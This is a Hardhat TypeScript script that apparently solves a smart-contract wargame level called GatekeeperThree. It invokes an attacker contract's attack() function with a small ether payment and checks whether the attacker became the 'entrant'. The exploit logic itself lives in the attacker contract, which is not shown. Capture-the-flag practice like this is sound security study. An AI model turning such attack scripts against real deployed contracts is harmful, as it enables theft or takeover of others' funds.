import { ethers, network } from "hardhat";
import { GatekeeperThree, GatekeeperThreeAttacker } from "../typechain-types";

async function main() {
  const chainId = network.config.chainId;
  const [attacker] = await ethers.getSigners();
  const isLocalTest = chainId === 31337;

  let gatekeeperThree: GatekeeperThree;

  const gatekeeperThreeAttacker: GatekeeperThreeAttacker =
    await ethers.getContract("GatekeeperThreeAttacker");

  if (isLocalTest) {
    gatekeeperThree = await ethers.getContract("GatekeeperThree");
  } else {
    gatekeeperThree = await ethers.getContractAt(
      "GatekeeperThree",
      "0x4B5750bfBFaFDB7f79A6DBBf233e54DbC14185d9"
    );
  }

  async function check() {
    const entrant = await gatekeeperThree.entrant();
    console.log("entrant: ", entrant);
    console.log("attacker: ", attacker.address);
  }

  console.log("Before the attack:");

  await check();

  const tx = await gatekeeperThreeAttacker.attack({
    value: ethers.utils.parseEther("0.0011"),
  });

  await tx.wait(isLocalTest ? 1 : 5);

  console.log("-------------------------------------------------------");
  console.log("After the attack:");

  await check();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
